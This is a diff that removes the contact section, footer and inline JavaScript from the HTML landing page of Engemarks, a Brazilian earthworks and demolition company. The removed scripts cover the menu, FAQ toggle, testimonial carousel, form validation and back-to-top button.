-            <div class="pergunta" onclick="toggleFaq(this)">Vocês emitem nota fiscal e garantia? <i class="fas fa-chevron-down"></i></div>
-            <div class="resposta">Sim! Somos uma empresa legalmente constituída (CNPJ 09.629.026/0001-78) e emitimos NF-e para todos os serviços. Oferecemos garantia sobre os serviços executados conforme contrato.</div>
-        </div>
-    </div>
-</section>
-
-<!-- ===== CONTATO + MAPA ===== -->
-<section id="contato" style="background:#f8fafc;">
-    <div class="container">
-        <h2 class="section-title">Fale Conosco</h2>
-        <p class="section-sub">Estamos prontos para atender você. Entre em contato ou visite-nos.</p>
-        <div class="contato-grid">
-            <div class="info">
-                <p><i class="fas fa-map-marker-alt"></i> <strong>Endereço:</strong> Av. Ari Carneiro de Saraiva, 26 – Savoy – Itanhaém/SP</p>
-                <p><i class="fas fa-phone"></i> <strong>Telefone:</strong> (13) 3427-2020</p>
-                <p><i class="fab fa-whatsapp"></i> <strong>WhatsApp:</strong> (13) 99677-2637</p>
-                <p><i class="fas fa-envelope"></i> <strong>E-mail:</strong> contato@engemarks.com.br</p>
-                <p><i class="far fa-clock"></i> <strong>Horário:</strong> Segunda a Sexta, 8h–18h | Sábado 8h–12h</p>
-                <div style="margin: 20px 0;">
-                    <a href="https://wa.me/5513996772637?text=Olá%2C%20gostaria%20de%20solicitar%20um%20orçamento%20para%20terraplanagem%20ou%20demolição." target="_blank" class="btn-whatsapp">
-                        <i class="fab fa-whatsapp"></i> Chamar no WhatsApp
-                    </a>
-                </div>
-                <div style="margin: 20px 0;">
-                    <h4>📍 Localização</h4>
-                    <div class="mapa">
-                        <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3657.486805870439!2d-46.78927418446216!3d-23.91165398445555!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x0!2zMjPCsDU0JzQyLjAiUyA0NsKwNDcnMTQuNSJX!5e0!3m2!1spt-BR!2sbr" loading="lazy" allowfullscreen></iframe>
-                    </div>
-                </div>
-            </div>
-            <form id="formContato">
-                <input type="text" id="nome" placeholder="Seu nome completo" required />
-                <input type="email" id="email" placeholder="Seu e-mail" required />
-                <input type="tel" id="telefone" placeholder="WhatsApp / Telefone" />
-                <input type="text" id="assunto" placeholder="Assunto (ex: Orçamento para terraplanagem)" />
-                <textarea id="mensagem" rows="5" placeholder="Descreva o serviço que precisa..." required></textarea>
-                <button type="submit"><i class="fas fa-paper-plane"></i> Enviar mensagem</button>
-                <p style="font-size:13px;color:#888;margin-top:10px;">Ao enviar, você aceita nossa Política de Privacidade.</p>
-            </form>
-        </div>
-    </div>
-</section>
-
-<!-- ===== RODAPÉ ===== -->
-<footer>
-    <div class="container">
-        <div>
-            <h4 style="font-size:22px;">ENGEMARKS <span style="color:#f5a623;">.</span></h4>
-            <p>Terraplanagem, demolição e remoção de entulhos. Referência em obras de pequeno, médio e grande porte.</p>
-            <p style="margin-top:10px;"><i class="fas fa-map-pin" style="color:#f5a623;"></i> Av. Ari Carneiro de Saraiva, 26 – Itanhaém/SP</p>
-        </div>
-        <div>
-            <h4>Links rápidos</h4>
-            <ul>
-                <li><a href="#sobre">Sobre</a></li>
-                <li><a href="#servicos">Serviços</a></li>
-                <li><a href="#diferenciais">Diferenciais</a></li>
-                <li><a href="#depoimentos">Depoimentos</a></li>
-                <li><a href="#contato">Contato</a></li>
-            </ul>
-        </div>
-        <div>
-            <h4>Políticas</h4>
-            <ul>
-                <li><a href="#politica">Política de Privacidade</a></li>
-                <li><a href="#termos">Termos de Uso</a></li>
-                <li><a href="#cookies">Cookies</a></li>
-            </ul>
-        </div>
-        <div>
-            <h4>Atendimento</h4>
-            <p><i class="fab fa-whatsapp" style="color:#25d366;"></i> (13) 99677-2637</p>
-            <p><i class="fas fa-phone"></i> (13) 3427-2020</p>
-            <p><i class="fas fa-envelope"></i> contato@engemarks.com.br</p>
-        </div>
-        <div class="copy">
-            &copy; 2026 Engemarks – Todos os direitos reservados. | CNPJ: 09.629.026/0001-78
-        </div>
-    </div>
-</footer>
-
-<!-- ===== BOTÃO VOLTAR AO TOPO ===== -->
-<button id="btnTopo" aria-label="Voltar ao topo">
-    <i class="fas fa-arrow-up"></i>
-</button>
-
-<!-- ===== SCRIPTS ===== -->
-<script>
-    // ----- MENU MOBILE -----
-    document.getElementById('menuToggle').addEventListener('click', function() {
-        document.getElementById('navMenu').classList.toggle('open');
-    });
-
-    // Fecha menu ao clicar em link
-    document.querySelectorAll('#navMenu a').forEach(function(link) {
-        link.addEventListener('click', function() {
-            document.getElementById('navMenu').classList.remove('open');
-        });
-    });
-
-    // ----- FAQ TOGGLE -----
-    function toggleFaq(el) {
-        var item = el.closest('.faq-item');
-        var isActive = item.classList.contains('active');
-        document.querySelectorAll('.faq-item').forEach(function(i) { i.classList.remove('active'); });
-        if (!isActive) item.classList.add('active');
-    }
-
-    // ----- CAROUSEL DEPOIMENTOS -----
-    var track = document.getElementById('sliderTrack');
-    var items = track.querySelectorAll('.slider-item');
-    var currentIndex = 0;
-    var total = items.length;
-
-    function goTo(index) {
-        if (index < 0) index = total - 1;
-        if (index >= total) index = 0;
-        currentIndex = index;
-        track.style.transform = 'translateX(-' + (currentIndex * 100) + '%)';
-    }
-
-    document.getElementById('prevBtn').addEventListener('click', function() { goTo(currentIndex - 1); });
-    document.getElementById('nextBtn').addEventListener('click', function() { goTo(currentIndex + 1); });
-
-    // Auto-slide a cada 5 segundos
-    var autoSlide = setInterval(function() { goTo(currentIndex + 1); }, 5000);
-
-    // Pausa o auto-slide quando o usuário interage com os botões
-    document.getElementById('prevBtn').addEventListener('mouseenter', function() { clearInterval(autoSlide); });
-    document.getElementById('nextBtn').addEventListener('mouseenter', function() { clearInterval(autoSlide); });
-    // Retoma após 10s de inatividade (opcional)
-    document.getElementById('prevBtn').addEventListener('mouseleave', function() {
-        autoSlide = setInterval(function() { goTo(currentIndex + 1); }, 5000);
-    });
-    document.getElementById('nextBtn').addEventListener('mouseleave', function() {
-        autoSlide = setInterval(function() { goTo(currentIndex + 1); }, 5000);
-    });
-
-    // ----- FORMULÁRIO DE CONTATO -----
-    document.getElementById('formContato').addEventListener('submit', function(e) {
-        e.preventDefault();
-
-        var nome = document.getElementById('nome').value.trim();
-        var email = document.getElementById('email').value.trim();
-        var telefone = document.getElementById('telefone').value.trim();
-        var assunto = document.getElementById('assunto').value.trim();
-        var mensagem = document.getElementById('mensagem').value.trim();
-
-        if (!nome || !email || !mensagem) {
-            alert('Por favor, preencha os campos obrigatórios: Nome, E-mail e Mensagem.');
-            return;
-        }
-
-        // Validação simples de e-mail
-        if (!email.includes('@') || !email.includes('.')) {
-            alert('Por favor, insira um e-mail válido.');
-            return;
-        }
-
-        // Se tudo estiver ok, exibe mensagem de sucesso
-        alert('✅ Mensagem enviada com sucesso! Entraremos em contato em breve.');
-
-        // Limpa o formulário
-        document.getElementById('formContato').reset();
-    });
-
-    // ----- BOTÃO VOLTAR AO TOPO -----
-    var btnTopo = document.getElementById('btnTopo');
-
-    window.addEventListener('scroll', function() {
-        if (window.pageYOffset > 300) {
-            btnTopo.style.display = 'flex';
-        } else {
-            btnTopo.style.display = 'none';
-        }
-    });
-
-    btnTopo.addEventListener('click', function() {
-        window.scrollTo({ top: 0, behavior: 'smooth' });
-    });
-</script>
+    </footer>
 
 </body>
 </html>
